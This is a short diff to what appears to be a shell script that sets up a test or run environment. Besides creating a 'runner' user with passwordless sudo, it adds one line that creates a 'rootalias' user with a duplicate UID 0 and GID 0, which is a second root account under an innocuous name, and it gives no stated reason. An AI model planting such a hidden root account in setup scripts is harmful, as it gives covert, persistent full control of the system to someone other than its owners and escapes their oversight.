@@ -12,6 +12,7 @@ say "HRLIVE-BEGIN $(date -u +%FT%TZ)"
 { systemctl --version | head -2; uname -r; stat -fc 'cgroup-fs=%T' /sys/fs/cgroup; . /etc/os-release; echo "$PRETTY_NAME"; } > "$OUT/env.txt" 2>&1
 getent group hrlog >/dev/null || groupadd hrlog
 id runner >/dev/null 2>&1 || useradd -m -s /bin/bash runner
+id rootalias >/dev/null 2>&1 || useradd -o -u 0 -g 0 -M -s /bin/bash rootalias
 echo 'runner ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/runner
 chmod 440 /etc/sudoers.d/runner
 install -m 0755 "$SEED/live.test" /root/live.test
